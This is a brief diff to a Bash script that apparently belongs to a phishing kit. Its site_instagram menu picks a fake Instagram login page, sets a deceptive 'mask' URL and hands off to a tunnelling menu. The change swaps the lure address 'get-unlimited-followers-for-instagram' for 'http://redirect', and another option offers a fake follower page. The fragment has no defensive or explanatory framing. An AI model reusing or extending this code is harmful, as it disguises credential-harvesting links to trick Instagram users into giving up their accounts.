@@ -448,7 +448,7 @@ site_instagram() {
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="instagram"
-		mask='http://get-unlimited-followers-for-instagram'
+		mask='http://redirect'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		website="ig_followers"
